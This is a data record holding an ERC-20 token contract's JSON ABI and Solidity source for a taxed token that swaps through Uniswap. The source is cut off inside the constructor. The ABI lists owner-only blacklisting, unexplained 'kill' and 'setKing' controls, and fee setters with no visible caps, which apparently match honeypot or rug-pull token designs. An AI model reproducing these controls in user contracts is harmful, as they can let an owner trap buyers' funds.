enabled\",\"type\":\"bool\"}],\"name\":\"SwapAndLiquifyEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"}],\"name\":\"SwapETHForTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"}],\"name\":\"SwapTokensForETH\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_buyDestroyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyMarketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyTeamFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_liquidityShare\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_marketingShare\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxDestroyAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellDestroyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellMarketingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellTeamFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tFeeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_teamShare\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalDistributionShares\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalTaxIfBuying\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalTaxIfSelling\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_walletMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airdropNumbs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newRouterAddress\",\"type\":\"address\"}],\"name\":\"changeRouterVersion\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"newPairAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkWalletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"enableDisableWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeMultipleAccountsFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"first\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTxLimitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isWalletLimitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kill\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWalletAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minimumTokensBeforeSwapAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"multipleBotlistAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setAirdropNumbs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyDestroyFee\",\"type\":\"uint256\"}],\"name\":\"setBuyDestFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLiquidityTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMarketingTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newTeamTax\",\"type\":\"uint256\"}],\"name\":\"setBuyTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLiquidityShare\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMarketingShare\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newTeamShare\",\"type\":\"uint256\"}],\"name\":\"setDistributionSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setIsExcludedFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsTxLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsWalletLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setKing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setMarketPairStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"setMarketingWalletAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxDestroy\",\"type\":\"uint256\"}],\"name\":\"setMaxDesAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"setMaxTxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLimit\",\"type\":\"uint256\"}],\"name\":\"setNumTokensBeforeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLiquidityTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newMarketingTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newTeamTax\",\"type\":\"uint256\"}],\"name\":\"setSelTaxes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newSellDestroyFee\",\"type\":\"uint256\"}],\"name\":\"setSellDestFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"setSwapAndLiquifyByLimitOnly\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setSwapAndLiquifyEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"setTeamWalletAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLimit\",\"type\":\"uint256\"}],\"name\":\"setWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAndLiquifyByLimitOnly\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAndLiquifyEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWalletAddress\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"waiveOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "// SPDX-License-Identifier: Unlicensed\r\npragma solidity ^0.8.4;\r\n\r\nabstract contract Context {\r\n\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\r\n        // for accounts without code, i.e. `keccak256('')`\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly {codehash := extcodehash(account)}\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success,) = recipient.call{ value : amount}(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n\r\n            if (returndata.length > 0) {\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address public _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function waiveOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function getTime() public view returns (uint256) {\r\n        return block.timestamp;\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ncontract Token is Context, IERC20, Ownable {\r\n\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    address payable public marketingWalletAddress;\r\n    address payable public teamWalletAddress;\r\n    address public deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n    mapping(address => bool) public _isBlacklisted;\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    mapping (address => bool) public isExcludedFromFee;\r\n    mapping (address => bool) public isWalletLimitExempt;\r\n    mapping (address => bool) public isTxLimitExempt;\r\n    mapping (address => bool) public isMarketPair;\r\n\r\n    uint256 public _buyLiquidityFee = 2;\r\n    uint256 public _buyMarketingFee = 3;\r\n    uint256 public _buyTeamFee = 4;\r\n    uint256 public _buyDestroyFee = 0;\r\n\r\n    uint256 public _sellLiquidityFee = 2;\r\n    uint256 public _sellMarketingFee = 3;\r\n    uint256 public _sellTeamFee = 4;\r\n    uint256 public _sellDestroyFee = 0;\r\n\r\n    uint256 public _liquidityShare = 2;\r\n    uint256 public _marketingShare = 3;\r\n    uint256 public _teamShare = 4;\r\n    uint256 public _totalDistributionShares = 9;\r\n\r\n    uint256 public _totalTaxIfBuying = 9;\r\n    uint256 public _totalTaxIfSelling = 9;\r\n\r\n    uint256 public _tFeeTotal;\r\n    uint256 public _maxDestroyAmount;\r\n    uint256 private _totalSupply;\r\n    uint256 public _maxTxAmount;\r\n    uint256 public _walletMax;\r\n    uint256 private _minimumTokensBeforeSwap = 0;\r\n    uint256 public airdropNumbs;\r\n    address private receiveAddress;\r\n    uint256 public first;\r\n    uint256 public kill = 0;\r\n\r\n\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    address public uniswapPair;\r\n\r\n    bool inSwapAndLiquify;\r\n    bool public swapAndLiquifyEnabled = true;\r\n    bool public swapAndLiquifyByLimitOnly = false;\r\n    bool public checkWalletLimit = true;\r\n\r\n    event SwapAndLiquifyEnabledUpdated(bool enabled);\r\n    event SwapAndLiquify(\r\n        uint256 tokensSwapped,\r\n        uint256 ethReceived,\r\n        uint256 tokensIntoLiqudity\r\n    );\r\n\r\n    event SwapETHForTokens(\r\n        uint256 amountIn,\r\n        address[] path\r\n    );\r\n\r\n    event SwapTokensForETH(\r\n        uint256 amountIn,\r\n        address[] path\r\n    );\r\n\r\n    modifier lockTheSwap {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n\r\n\r\n    constructor (\r\n        string memory coinName,\r\n        string memory coinSymbol,\r\n        uint8 coinDecimals,\r\n        uint256 supply,\r\n        address router,\r\n        address owner,\r\n        address marketingAddress,\r\n        address teamAddress,\r\n        address service\r\n    ) payable {\r\n\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);\r\n\r\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), _uniswapV2Router.WETH());\r\n\r\n        _name = coinName;\r\n        _symbol = coinSymbol;\r\n        _decimals = coinDecimals;\r\n        _owner = owner;\r\n        receiveAddress = owner;\r\n        _totalSupply = supply  * 10 ** _decimals;\r\n        _maxTxAmount = supply * 10**_decimals;\r\n        _walletMax = supply * 10**_decimals;\r\n        _maxDestroyAmount = supply * 10**_decimals;\r\n        _minimumTokensBeforeSwap = 1 * 10**_decimals;\r\n        marketingWalletAddress = payable(marketingAddress);\r\n        teamWalletAddress = payable(teamAddress);\r\n        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);\r\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);\r\n        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);\r\n        uniswapV2Router = _uniswapV2Router;\r\n        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;\r\n        isExcludedFromFee[owner] = true;\r\n        isExcludedFromFee[address(this)] = true;\r\n\r\n        isWalletLimitExempt[owner] = true;\r\n        isWalletLimitExempt[address(uniswapPair)] = true;\r\n        isWalletLimitExempt[address(this)] = true;\r\n        isWalletLimitExempt[deadAddress] = true;\r\n\r\n        isTxLimitExempt[owner] = true;\r\n        isTxLimitExempt[deadAddress] = true;\r\n        